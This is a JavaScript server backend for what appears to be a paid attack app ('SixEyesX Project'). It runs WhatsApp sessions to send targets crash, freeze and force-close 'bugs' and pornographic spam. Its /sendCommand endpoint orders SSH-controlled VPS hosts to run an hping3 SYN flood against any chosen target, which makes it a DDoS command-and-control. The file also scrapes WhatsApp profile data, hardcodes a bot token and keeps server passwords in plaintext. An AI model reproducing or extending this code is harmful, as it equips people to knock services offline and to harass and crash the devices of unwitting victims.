const originalStdoutWrite = process.stdout.write.bind(process.stdout);
const originalStderrWrite = process.stderr.write.bind(process.stderr);
process.on('unhandledRejection', (reason, promise) => {
  console.log('Unhandled Rejection:', reason);
});

process.on('uncaughtException', (err) => {
  console.log('Uncaught Exception:', err);
});

process.stdout.write = (chunk, encoding, callback) => {
  if (typeof chunk === 'string' && (
    chunk.includes('Closing stale open session') ||
    chunk.includes('Closing session') ||
    chunk.includes('Failed to decrypt message') ||
    chunk.includes('Session error') ||
    chunk.includes('Closing open session') ||
    chunk.includes('Removing old closed'))
  ) return true;
  return originalStdoutWrite(chunk, encoding, callback);
};
process.stderr.write = (chunk, encoding, callback) => {
  if (typeof chunk === 'string' && (
    chunk.includes('Closing stale open session') ||
    chunk.includes('Closing session:') ||
    chunk.includes('Failed to decrypt message') ||
    chunk.includes('Session error:') ||
    chunk.includes('Closing open session') ||
    chunk.includes('Removing old closed'))
  ) return true;
  return originalStderrWrite(chunk, encoding, callback);
};

const safeExit = process.exit;
const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    makeChatsSocket,
    generateProfilePicture,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    encodeWAMessage,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestWaWebVersion,
    templateMessage,
    fetchLatestBaileysVersion,
    InteractiveMessage,    
    Header,
    viewOnceMessage,
    groupStatusMentionMessage,
} = require('@whiskeysockets/baileys');
const express = require("express");
const readline = require("readline");
const crypto = require("crypto");
const app = express();
const TelegramBot = require("node-telegram-bot-api");
const fs = require("fs");
const fsPromises = require('fs').promises;
const path = require('path');
const pino = require('pino');
const P = require('pino')
const axios = require('axios')
const vm = require('vm')
const os = require('os');
const WebSocket = require('ws');
const http = require('http');
const server = http.createServer(app); // gunakan Express app
const wss = new WebSocket.Server({ server });
let wsClients = {}; // { username: WebSocket }
let chatList = [];  // { from, to, message, time }
const CHAT_FILE = 'chat.json';
const GLOBAL_CHAT_FILE = 'global.json'; // ← storage global chat
const MAX_GLOBAL_HISTORY = 100;          // ← batas pesan yang disimpan
const globalChatClients = new Set();     // ← Set<ws> semua user di global room

// ── Global Chat: load / save ───────────────────────────────
function loadGlobalHistory() {
  try {
    if (!fs.existsSync(GLOBAL_CHAT_FILE)) return [];
    return JSON.parse(fs.readFileSync(GLOBAL_CHAT_FILE, 'utf8')) || [];
  } catch { return []; }
}

function saveGlobalHistory(messages) {
  try {
    fs.writeFileSync(GLOBAL_CHAT_FILE, JSON.stringify(messages, null, 2), 'utf8');
  } catch (err) {
    console.error('[global_chat] Gagal simpan:', err.message);
  }
}

function appendGlobalMessage(msg) {
  const history = loadGlobalHistory();
  history.push(msg);
  if (history.length > MAX_GLOBAL_HISTORY)
    history.splice(0, history.length - MAX_GLOBAL_HISTORY);
  saveGlobalHistory(history);
}

function broadcastGlobalChat(payload, exclude = null) {
  const json = JSON.stringify(payload);
  for (const client of globalChatClients) {
    if (client !== exclude && client.readyState === 1 /* OPEN */)
      client.send(json);
  }
}
// ── End Global Chat helpers ────────────────────────────────

const { Client } = require('ssh2');
const DB_PATH = "./database.json";
const SESSION_PATH = path.join(__dirname, "permenmd");
const THIRTY_MINUTES = 30 * 60 * 1000; // 30 menit
let activeKeys = {};
const KEY_FILE = path.join(__dirname, 'keyList.json');
const bugs = [
    { bug_id: "layinvisible", bug_name: "BEBAS SPAM DELAY" },
    { bug_id: "Delayultimate", bug_name: "DELAY AMAN UNTUK NOKOS" },
    { bug_id: "fc", bug_name: "FORCE CLOSE NO CLICK" },
    { bug_id: "frame", bug_name: "HARD DELAY X FREEZE" },
    { bug_id: "over", bug_name: "SUPER FRAME BRUTALITY" },
    { bug_id: "dozer", bug_name: "X-BULLDOZER" },
    { bug_id: "combo", bug_name: "X-COMBO" },
    { bug_id: "hentai", bug_name: "SPAM HENTAI ANIME" },
    { bug_id: "spamVideo", bug_name: "SPAM BOKEP" },
    { bug_id: "bokep", bug_name: "SPAM PORNO/BOKEP" },
    { bug_id: "spam_call", bug_name: "SUPER CRASH UI" },
    { bug_id: "hard", bug_name: "OVER BLANK & FREEZE" },
    { bug_id: "freeze", bug_name: "X-FREEZE DEVICES HARD BUGS" },
    { bug_id: "stuck", bug_name: "FREEZE CLICK STUCK HOME" },
    { bug_id: "fc_ios", bug_name: "FORCE CLOSE IOS/IPHONE" },
    { bug_id: "crash_ios", bug_name: "CRASH IPHONE" },
    { bug_id: "kill_ios", bug_name: "COMBO ALL CRASH IPHONE" }
];
let cncActive = true; // Flag CNC
let vpsList = [];

let vpsConnections = {}
const VPS_FILE = 'vps.json';
let sikmanuk = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
fs.watchFile("keyList.json", () => {
  console.log("[📂] keyList.json changed, reloading...");
  sikmanuk = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
});


// Load chat from file
if (fs.existsSync(CHAT_FILE)) {
  chatList = JSON.parse(fs.readFileSync(CHAT_FILE, 'utf8'));
}

// Simpan chat
function saveChat() {
  fs.writeFileSync(CHAT_FILE, JSON.stringify(chatList, null, 2));
}

// Sanitize fungsi
function sanitize(input) {
  return String(input)
    .replace(/[<>]/g, '') // hilangkan tag html
    .replace(/[\r\n]/g, ' ') // hilangkan newline
    .slice(0, 250); // batas 250 karakter
}

const TOKEN = "7760236547:AAHb7LE-QXhg9lhGqMwEtN0k6sR3rFf59RE"; // Ganti dengan token bot kamu
const bot = new TelegramBot(TOKEN, { polling: true });

const wsPort = 3627;

const PORT = 3627;

// Fungsi Helper untuk Logging Asinkron (Mencegah Server Freeze/Lag)
async function appendLogAsync(filePath, data) {
  try {
    // Cek ukuran file dulu, jika terlalu besar (>5MB) hapus isi lama
    if (fs.existsSync(filePath)) {
      const stats = fs.statSync(filePath);
      if (stats.size > 5 * 1024 * 1024) { // 5MB Limit
        fs.writeFileSync(filePath, ''); // Reset file jika terlalu besar
      }
    }
    await fsPromises.appendFile(filePath, data);
  } catch (err) {
    console.error(`[❌ LOG ERROR] Gagal menulis log: ${err.message}`);
  }
}

async function autoRefresh() {
  try {
    // ===== CLEAR SESSION =====
    if (!fs.existsSync(SESSION_PATH)) {
      console.log("⚠️ Folder 'permenmd' tidak ditemukan.");
    } else {
      let deletedCount = 0;
      const userFolders = fs.readdirSync(SESSION_PATH);

      for (const userFolder of userFolders) {
        const userPath = path.join(SESSION_PATH, userFolder);
        if (!fs.lstatSync(userPath).isDirectory()) continue;

        const hasJson = fs.readdirSync(userPath).some(f => f.endsWith(".json"));
        if (!hasJson) {
          fs.rmSync(userPath, { recursive: true, force: true });
          deletedCount++;
        }
      }
      console.log(`[AUTO REFRESH] ${deletedCount} folder session kosong dihapus.`);
    }

    // ===== AUTO RESTART =====
    console.log("[AUTO REFRESH] Auto restart dijalankan...");

    setTimeout(() => {
      console.log("[AUTO REFRESH] Server aktif dan berjalan normal setelah auto restart.");
    }, 8000);

    setTimeout(() => {
      console.log("[AUTO REFRESH] Process restart server");
      process.exit(0);
    }, 5000);

  } catch (err) {
    console.error("[AUTO REFRESH] Error", err);
  }
}
// ===== Setup Log System =====
const LOGS_DIR = path.join(__dirname, 'user_logs'); // Folder khusus log user

function hapusIsiUserLogs() {
  if (!fs.existsSync(LOGS_DIR)) {
    console.log("[AUTOCLEAN LOGS] Folder tidak ditemukan");
    return;
  }

  const files = fs.readdirSync(LOGS_DIR);

  for (const file of files) {
    const filePath = path.join(LOGS_DIR, file);
    fs.rmSync(filePath, { recursive: true, force: true });
  }

  console.log("[AUTOCLEAN LOGS] Isi folder berhasil dihapus");
}

// Buat folder jika belum ada
if (!fs.existsSync(LOGS_DIR)) {
  fs.mkdirSync(LOGS_DIR, { recursive: true });
  console.log("[LOGS] Folder 'user_logs' dibuat.");
}

/**
 * Fungsi untuk menyimpan aktivitas user ke file JSON mereka sendiri
 * @param {string} username - Username user
 * @param {string} type - 'login', 'bug', 'create'
 * @param {string} title - Judul aktivitas
 * @param {string} description - Detail aktivitas
 */
function saveUserLog(username, type, title, description) {
  try {
    const userLogPath = path.join(LOGS_DIR, `${username}.json`);
    let logs = [];

    // Baca log lama jika ada
    if (fs.existsSync(userLogPath)) {
      logs = JSON.parse(fs.readFileSync(userLogPath, 'utf8'));
    }

    // Tambah log baru
    logs.push({
      type: type,
      title: title,
      description: description,
      timestamp: Date.now() // Timestamp dalam milidetik
    });

    // Simpan kembali (Overwrite)
    fs.writeFileSync(userLogPath, JSON.stringify(logs, null, 2));
    console.log(`[LOGS] Activity saved for ${username}: ${type}`);
  } catch (err) {
    console.error(`[LOGS] Gagal simpan log ${username}:`, err.message);
  }
}

wss.on('connection', function (ws, req) {
  let username;

  ws.on('message', function (msg) {
    try {
      const data = JSON.parse(msg);

      if (data.type === 'sessionCheck') {
        const sessionList = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
        const user = sessionList.find(e => e.sessionKey === data.key);

        if (!user) {
          ws.send(JSON.stringify({
            type: "forceLogout",
            reason: "Invalid key"
          }));
          return ws.close();
        }

        if (user.androidId !== data.androidId) {
          ws.send(JSON.stringify({
            type: "forceLogout",
            reason: "Another device has logged in"
          }));
          return ws.close();
        }
      }

      if (data.type === 'validate') {
        const session = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
        const validKey = session.find(e => e.sessionKey === data.key)
        const validId = session.find(e => e.androidId === data.androidId)

        if (!validKey) {
          ws.send(JSON.stringify({
            type: "myInfo",
            valid: false,
            reason: "keyInvalid"
          }));
          return ws.close();
        }

        if (!validId) {
          ws.send(JSON.stringify({
            type: "myInfo",
            valid: false,
            reason: "androidIdMismatch"
          }));
          return ws.close();
        }

        // Autentikasi sukses
        ws.send(JSON.stringify({
          type: "myInfo",
          valid: true,
          username: session.username,
          androidId: session.androidId,
          role: session.role || "member"
        }));

        const interval = setInterval(() => {
          const session = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
          const validKey = session.find(e => e.sessionKey === data.key)
          const validId = session.find(e => e.androidId === data.androidId)

          if (!validKey) {
            ws.send(JSON.stringify({
              type: "myInfo",
              valid: false,
              reason: "keyInvalid"
            }));
            return ws.close();
          }

          if (!validId) {
            ws.send(JSON.stringify({
              type: "myInfo",
              valid: false,
              reason: "androidIdMismatch"
            }));
            return ws.close();
          }

        }, 10000);
      }
      if (data.type === 'auth') {
        username = getUserByKey(data.key);
        console.log(username)
        if (!username) return ws.close();
        wsClients[username] = ws;

        // Kirim chatList awal
        const list = chatList
          .filter(m => m.from === username || m.to === username)
          .map(m => (m.from === username ? m.to : m.from));

        ws.send(JSON.stringify({
          type: "chatList",
          users: [...new Set(list)],
        }));
      }

      if (data.type === 'chat') {
        const to = data.to;
        const message = sanitize(data.message);
        if (!username || !to || !message || message.length > 250) return;

        const chat = {
          from: username,
          to,
          message,
          time: new Date().toISOString()
        };
        chatList.push(chat);
        saveChat();

        // Kirim ke pengirim
        ws.send(JSON.stringify({ type: 'chat', message: { ...chat, fromMe: true } }));

        // Kirim ke penerima jika online
        if (wsClients[to]) {
          wsClients[to].send(JSON.stringify({
            type: 'chat',
            message: { ...chat, fromMe: false }
          }));
        }
      }

      if (data.type === 'getMessages') {
        const withUser = data.with;
        const messages = chatList
          .filter(m =>
            (m.from === username && m.to === withUser) ||
            (m.from === withUser && m.to === username)
          )
          .map(m => ({
            ...m,
            fromMe: m.from === username
          }));

        ws.send(JSON.stringify({ type: 'messages', with: withUser, messages }));
      }

      // ── stats ──────────────────────────────────────────────
      if (data.type === 'stats') {
        ws.send(JSON.stringify({
          type: 'stats',
          onlineUsers: wss.clients.size,
          activeConnections: wss.clients.size,
        }));
      }

      // ── joinChat (global room) ─────────────────────────────
      if (data.type === 'joinChat' && data.room === 'global') {
        const chatUsername = (data.username || 'Anonymous').trim();

        // Simpan username di ws object agar bisa dipakai saat close
        ws._globalChatUsername = chatUsername;

        // Daftarkan ke room
        globalChatClients.add(ws);

        // Kirim history ke user yang baru masuk
        ws.send(JSON.stringify({
          type: 'chatHistory',
          room: 'global',
          messages: loadGlobalHistory(),
        }));

        // Beritahu semua orang bahwa user baru masuk
        broadcastGlobalChat({
          type: 'userJoined',
          room: 'global',
          username: chatUsername,
          onlineInRoom: globalChatClients.size,
        }, ws);

        console.log(`[global_chat] ${chatUsername} joined (${globalChatClients.size} online)`);
      }

      // ── chatMessage (global room) ──────────────────────────
      if (data.type === 'chatMessage' && data.room === 'global') {
        const chatUsername = data.username || ws._globalChatUsername || 'Anonymous';
        const message = (data.message || '').trim().slice(0, 1000);
        if (!message) return;

        const timestamp = new Date().toISOString();
        const msg = { username: chatUsername, message, timestamp, room: 'global' };

        // Simpan ke global.json
        appendGlobalMessage(msg);

        const payload = { type: 'chatMessage', ...msg };

        // Kirim balik ke pengirim
        ws.send(JSON.stringify(payload));

        // Sebar ke semua anggota room lain
        broadcastGlobalChat(payload, ws);

        console.log(`[global_chat] ${chatUsername}: ${message.slice(0, 60)}`);
      }
      // ── End Global Chat handlers ───────────────────────────

    } catch (e) {
      console.error("WS error:", e.message);
    }
  });

  ws.on('close', () => {
    if (username && wsClients[username]) {
      delete wsClients[username];
    }

    // Keluarkan dari global chat room jika sedang di sana
    if (globalChatClients.has(ws)) {
      globalChatClients.delete(ws);
      const leftUsername = ws._globalChatUsername;
      if (leftUsername) {
        broadcastGlobalChat({
          type: 'userLeft',
          room: 'global',
          username: leftUsername,
          onlineInRoom: globalChatClients.size,
        });
        console.log(`[global_chat] ${leftUsername} left (${globalChatClients.size} online)`);
      }
    }
  });
});

async function startUserSessions() {
  const vipDir = path.join(__dirname, 'vip');
  const vvipDir = path.join(__dirname, 'vvip');
  const baseDir = 'permenmd';

  // Buat folder vvip kalau belum ada
  if (!fs.existsSync(vvipDir)) {
    fs.mkdirSync(vvipDir, { recursive: true });
    console.log(`[INFO] Folder vvip dibuat.`);
  }

  // Helper: copy creds ke vvip/nomor.json setelah konek
  async function copyCredsToVVIP(sessionPath, sessionName) {
    const credsSource = path.join(sessionPath, `${sessionName}.json`);
    const credsDest = path.join(vvipDir, `${sessionName}.json`);
    try {
      if (fs.existsSync(credsSource)) {
        fs.copyFileSync(credsSource, credsDest);
        console.log(`[VVIP] Creds copied: ${sessionName}.json → vvip/`);
      } else {
        console.warn(`[VVIP] creds.json tidak ditemukan di ${sessionPath}`);
      }
    } catch (err) {
      console.error(`[VVIP ERROR] Gagal copy creds ${sessionName}:`, err.message);
    }
  }

  // 1. Scan VIP Folder (Root)
  if (fs.existsSync(vipDir)) {
    const vipFolders = fs.readdirSync(vipDir).filter(f =>
      fs.statSync(path.join(vipDir, f)).isDirectory()
    );

    console.log(`[DEBUG] Scanning VIP folder. Found ${vipFolders.length} items.`);

    for (const sessionName of vipFolders) {
      const sessionPath = path.join(vipDir, sessionName);

      if (activeConnections[sessionName]) {
        console.log(`[SKIP] VIP Session ${sessionName} already active.`);
        continue;
      }

      try {
        console.log(`[START] Connecting VIP session: ${sessionName}`);
        await connectSession(sessionPath, sessionName);
        await copyCredsToVVIP(sessionPath, sessionName); // ✅ Copy setelah konek
      } catch (err) {
        console.error(`[ERROR] Failed VIP session ${sessionName}:`, err.message);
      }
    }
  }

  // 2. Scan User Folders (permenmd)
  const subfolders = fs.readdirSync(baseDir)
    .map(name => path.join(baseDir, name))
    .filter(p => fs.lstatSync(p).isDirectory());

  console.log(`[DEBUG] Found ${subfolders.length} subfolders inside permenmd`);

  for (const folder of subfolders) {
    try {
      const jsonFiles = fs.readdirSync(folder)
        .filter(file => file.endsWith(".json"))
        .map(file => path.join(folder, file));

      console.log(`[DEBUG] Found ${jsonFiles.length} JSON files in ${folder}`);

      for (const jsonFile of jsonFiles) {
        const sessionName = path.basename(jsonFile, ".json");

        if (activeConnections[sessionName]) {
          console.log(`[SKIP] Session ${sessionName} already active, skipping...`);
          continue;
        }

        try {
          console.log(`[START] Connecting session: ${sessionName}`);
          await connectSession(folder, sessionName);
          await copyCredsToVVIP(folder, sessionName); // ✅ Copy setelah konek
        } catch (err) {
          console.error(`[ERROR] Failed to start session ${sessionName}:`, err.message);
        }
      }
    } catch (err) {
      console.log(`[❌ ERROR FOLDER] Gagal scan folder ${folder}: ${err.message}`);
    }
  }
}

app.use(express.urlencoded({ extended: false }));
app.use(express.json());
// ===== Rate Limit Middleware (20 req/detik per token) =====
const rateLimitMap = {};
function rateLimiter(req, res, next) {
  const key = (req.query && req.query.key) || (req.body && req.body.key) || null;
  if (!key) return next();

  const now = Date.now();
  if (!rateLimitMap[key]) rateLimitMap[key] = [];

  rateLimitMap[key] = rateLimitMap[key].filter(ts => now - ts < 1000);
  rateLimitMap[key].push(now);

  if (rateLimitMap[key].length > 2) {
    const db = loadDatabase();
    const user = db.find(u => u.username === (activeKeys[key]?.username || "unknown"));
    console.warn(`[🚫 RATE LIMIT] Token '${key}' (${user?.username || 'unknown'}) melebihi batas 20 req/detik.`);

    return res.status(429).json({
      valid: false,
      rateLimit: true,
      message: "Terlalu banyak permintaan! Maksimal 20 request per detik.",
    });
  }

  next();
}

app.use(rateLimiter);


app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*"); // atau ganti * dengan domain spesifik
  res.header("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  res.header("Access-Control-Allow-Headers", "Content-Type");
  next();
});


if (fs.existsSync(KEY_FILE)) {
  try {
    const rawData = fs.readFileSync(KEY_FILE, 'utf8');
    const parsed = JSON.parse(rawData); // ini array

    for (const user of parsed) {
      if (user.sessionKey && user.username && user.lastLogin) {
        const created = new Date(user.lastLogin).getTime();
        const expires = created + 10 * 60 * 1000; // +10 menit

        activeKeys[user.sessionKey] = {
          username: user.username,
          created,
          expires,
        };
      }
    }

    console.log("✅ activeKeys loaded from keyList.json.");
  } catch (err) {
    console.error("❌ Failed to load keyList.json:", err.message);
  }
}


function connectToAllVPS() {
  if (!cncActive) return;

  console.log("🔄 Connecting to all VPS servers...");

  for (const vps of vpsList) {
    if (vpsConnections[vps.host]) {
      console.log(`✅ Already connected to ${vps.host}`);
      continue;
    }

    const conn = new Client();

    conn.on('ready', () => {
      if (!cncActive) {
        conn.end(); // Langsung tutup kalau CNC tidak aktif
        return;
      }

      console.log(`✅ Connected to VPS: ${vps.host}`);
      vpsConnections[vps.host] = conn;

      // Jika koneksi putus, reconnect otomatis
      conn.on('close', () => {
        console.log(`🔌 Disconnected: ${vps.host}`);
        delete vpsConnections[vps.host];

        if (cncActive) {
          console.log(`🔁 Reconnecting to ${vps.host} in 5s...`);
          setTimeout(connectToAllVPS, 5000);
        }
      });
    });

    conn.on('error', (err) => {
      console.log(`❌ Failed to connect to ${vps.host}: ${err.message}`);
    });

    conn.connect({
      host: vps.host,
      username: vps.username,
      password: vps.password,
      readyTimeout: 5000
    });
  }
}

// 🚫 Disconnect semua koneksi (misal saat restart)
function disconnectAllVPS() {
  console.log("🛑 Disconnecting all VPS connections...");
  cncActive = false;

  for (const host in vpsConnections) {
    vpsConnections[host].end();
    delete vpsConnections[host];
  }
}

// Load VPS list saat server pertama kali jalan
if (fs.existsSync(VPS_FILE)) {
  vpsList = JSON.parse(fs.readFileSync(VPS_FILE, 'utf8'));
  console.log("📥 VPS list loaded.");
  connectToAllVPS(); // Connect ke semua VPS saat server jalan
}

// Pantau perubahan file VPS
fs.watch(VPS_FILE, () => {
  try {
    vpsList = JSON.parse(fs.readFileSync(VPS_FILE, 'utf8'));
    console.log("🔄 VPS list updated.");
    connectToAllVPS(); // Connect ke semua VPS saat server jalan
  } catch (e) {
    console.error("❌ Failed to update VPS list:", e.message);
  }
});

// Middleware: Cek sessionKey dan ambil username
function getUserByKey(key) {
  const keyInfo = activeKeys[key];
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  return user ? keyInfo.username : null;
}

// GET /myServer
app.get("/myServer", (req, res) => {
  const key = req.query.key;
  const username = getUserByKey(key);
  if (!username) return res.status(401).json({ error: "Invalid session key" });

  const userVPS = vpsList.filter(vps => vps.owner === username);
  res.json(userVPS);
});

// POST /addServer
app.post("/addServer", (req, res) => {
  const { key, host, username: sshUser, password } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  if (!host || !sshUser || !password) return res.status(400).json({ error: "Missing fields" });

  const newVPS = { host, username: sshUser, password, owner };
  vpsList.push(newVPS);
  fs.writeFileSync(VPS_FILE, JSON.stringify(vpsList, null, 2));
  res.json({ success: true, message: "VPS added" });
});

// POST /delServer
app.post("/delServer", (req, res) => {
  const { key, host } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  const before = vpsList.length;
  vpsList = vpsList.filter(vps => !(vps.host === host && vps.owner === owner));
  fs.writeFileSync(VPS_FILE, JSON.stringify(vpsList, null, 2));

  const deleted = before !== vpsList.length;
  res.json({ success: deleted, message: deleted ? "VPS deleted" : "VPS not found" });
});

// POST /sendCommand
app.post("/sendCommand", (req, res) => {
  const { key, target, port, duration } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  if (!target || !port || !duration) return res.status(400).json({ error: "Missing fields" });

  const userVPS = vpsList.filter(vps => vps.owner === owner);
  if (userVPS.length === 0) return res.status(400).json({ error: "No VPS available for this user" });

  for (const vps of userVPS) {
    const conn = vpsConnections[vps.host];
    if (!conn) {
      console.log(`❌ Not connected to ${vps.host}`);
      continue;
    }

    const command = `screen -dmS hping3 -S --flood ${target} -p ${port}`;
    const killCmd = `sleep ${duration}; pkill screen`;

    conn.exec(`${command} && ${killCmd}`, (err, stream) => {
      if (err) return console.error(`❌ Exec error on ${vps.host}:`, err.message);
      stream.on('close', (code, signal) => {
        console.log(`✅ Command done on ${vps.host} (code: ${code})`);
      });
    });
  }

  res.json({ success: true, message: `Command sent to ${userVPS.length} VPS` });
});


function loadDatabase() {
  if (!fs.existsSync(DB_PATH)) {
    fs.writeFileSync(DB_PATH, JSON.stringify([]));
    console.log("[🗃️ DB] Database baru dibuat.");
  }
  const data = JSON.parse(fs.readFileSync(DB_PATH));
  return data;
}

function saveDatabase(data) {
  fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2));
}

function generateKey() {
  const key = crypto.randomBytes(8).toString("hex");
  console.log("[🔑 GEN] Key baru dibuat:", key);
  return key;
}

function isExpired(user) {
  const expired = new Date(user.expiredDate) < new Date();
  console.log(`[⏳ EXP] ${user.username} expired:`, expired);
  return expired;
}

app.get("/getInfo", async (req, res) => {
  const { key, number } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const bizKeys = Object.keys(biz);
  if (!bizKeys.length) return res.json({ valid: false, message: "No connection" });

  const sock = biz[bizKeys[Math.floor(Math.random() * bizKeys.length)]];
  const jid = number.includes("@") ? number : number + "@s.whatsapp.net";

  try {
    const ppUrl = await sock.profilePictureUrl(jid, 'image').catch(() => null);
    const statusObj = await sock.fetchStatus(jid).catch(() => null);
    const check = await sock.onWhatsApp(number).catch(() => []);
    const info = check[0] || {};

    return res.json({
      valid: true,
      number: number,
      photo: ppUrl || "https://static.vecteezy.com/system/resources/previews/009/292/244/non_2x/default-avatar-icon-of-social-media-user-vector.jpg",
      bio: statusObj?.status || "No bio",
      online: !!statusObj?.lastSeen,
      type: info.biz ? "business" : "personal"
    });
  } catch (err) {
    console.warn("[❌ GETINFO ERROR]", err.message);
    return res.json({ valid: false, message: "Query failed" });
  }
});

const KEY_LIST_FILE = path.join(__dirname, 'keyList.json');

function loadKeyList() {
  try {
    return JSON.parse(fs.readFileSync(KEY_LIST_FILE, 'utf8'));
  } catch {
    return [];                // file belum ada / rusak → mulai kosong
  }
}

function saveKeyList(list) {
  fs.writeFileSync(KEY_LIST_FILE, JSON.stringify(list, null, 2));
}

function recordKey({ username, key, role, ip, androidId }) {
  const list = loadKeyList();
  const stamp = new Date().toISOString();
  const idx = list.findIndex(e => e.username === username);

  if (idx !== -1) {
    list[idx] = { username, lastLogin: stamp, sessionKey: key, ipAddress: ip, androidId };
  } else {
    list.push({ username, lastLogin: stamp, sessionKey: key, ipAddress: ip, androidId });
  }

  saveKeyList(list);
}

const news = [
  {
    image: "https://ganga--link--ghhzdp9sv8hk.code.run/i/w4n7aq1n.jpg",
    title: "SixEyesX Project V15",
    desc: "Developed By @xyzyanzzi"
  }
];

// ===== Endpoint: Ambil Riwayat Aktivitas User =====
app.get("/getMyActivity", (req, res) => {
  const { key } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false, message: "Invalid session key" });

  const username = keyInfo.username;
  const userLogPath = path.join(LOGS_DIR, `${username}.json`);

  try {
    if (!fs.existsSync(userLogPath)) {
      // Jika belum ada log sama sekali, return array kosong
      return res.json({ valid: true, activities: [] });
    }

    const logs = JSON.parse(fs.readFileSync(userLogPath, 'utf8'));

    // Urutkan dari yang terbaru
    logs.sort((a, b) => b.timestamp - a.timestamp);

    return res.json({ valid: true, activities: logs });
  } catch (err) {
    console.error("[GET LOGS ERROR]", err.message);
    return res.status(500).json({ valid: false, message: "Gagal mengambil log" });
  }
});

// ===== Endpoint: Validate & Login (With Device Lock) =====
app.post("/validate", (req, res) => {
  const { username, password, version, androidId } = req.body;

  if (!androidId) {
    return res.json({ valid: false, message: "androidId required" });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === username && u.password === password);

  if (!user) return res.json({ valid: false });

  if (isExpired(user)) {
    return res.json({ valid: true, expired: true });
  }

  // --- LOGIKA CEK PERANGKAT (DEVICE LOCK) ---
  const keyList = loadKeyList();
  const existingSession = keyList.find(e => e.username === username);

  // Jika user sudah punya session dan Device ID berbeda dengan yang login sekarang
  if (existingSession) {
    const oldAndroid = existingSession.androidId;
    const newAndroid = androidId;

    if (oldAndroid !== newAndroid) {
      console.log(`🚫 LOGIN DITOLAK: ${username} | Device Lama: ${oldAndroid} | Device Baru: ${newAndroid}`);

      // KIRIM PESAN ERROR KHUSUS SEHINGGA APLIKASI FLUTTER TAHU
      return res.json({
        valid: false,
        message: "Akun ini sedang login di perangkat lain. Silakan logout terlebih dahulu di perangkat lama."
      });
    }
  }
  // -------------------------------------------

  // Jika sampai sini, berarti:
  // 1. User belum pernah login (existingSession = null)
  // 2. ATAU Device ID sama (Refresh Key)

  const key = generateKey();
  activeKeys[key] = {
    username,
    created: Date.now(),
    expires: Date.now() + 10 * 60 * 1000,
  };

  recordKey({
    username,
    key,
    role: user.role || 'member',
    ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip,
    androidId,
  });

  saveUserLog(
    username,
    "login",
    "Login Berhasil",
    `IP: ${req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip} | Device: ${androidId}`
  );

  return res.json({
    valid: true,
    expired: false,
    key,
    expiredDate: user.expiredDate,
    role: user.role || "member",
    listBug: bugs,
    news
  });
});

app.get("/myInfo", (req, res) => {
  const { username, password, androidId, key } = req.query;
  console.log("[ℹ️ INFO] Fetching info for:", username);

  const db = loadDatabase();
  const user = db.find(u => u.username === username && u.password === password);
  const keyList = loadKeyList();
  const userKey = keyList.find(k => k.username === username);
  console.log(userKey)

  if (!userKey) {
    console.log("[❌ KEY] Invalid or missing session key.");
    return res.json({ valid: false, reason: "session" });
  }

  if (userKey.androidId !== androidId) {
    console.log("[⚠️ DEVICE] Device mismatch:", userKey.androidId, "!=", androidId);
    return res.json({ valid: false, reason: "device" });
  }

  if (!user) {
    console.log("[❌ INFO] User not found.");
    return res.json({ valid: false });
  }

  if (isExpired(user)) {
    console.log("[⚠️ INFO] User expired.");
    return res.json({ valid: true, expired: true });
  }

  recordKey({
    username,
    key,
    role: user.role || 'member',
    ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip,
    androidId
  });

  console.log("[✅ INFO] Info dikirim untuk:", username);

  return res.json({
    valid: true,
    expired: false,
    key,
    username: user.username,
    password: "******",
    expiredDate: user.expiredDate,
    role: user.role || "member",
    listBug: bugs,
    news: news // ✅ Tambahkan ini
  });
});

app.post("/changepass", (req, res) => {
  const { username, oldPass, newPass } = req.body;
  if (!username || !oldPass || !newPass) {
    return res.json({ success: false, message: "Incomplete data" });
  }

  const db = loadDatabase();
  const idx = db.findIndex(u => u.username === username && u.password === oldPass);
  if (idx === -1) {
    return res.json({ success: false, message: "Invalid credentials" });
  }

  db[idx].password = newPass;
  saveDatabase(db);

  return res.json({ success: true, message: "Password updated successfully" });
});
// ===== QUEUE SYSTEM =====
const requestQueue = [];
let isProcessing = false;

async function processQueue() {
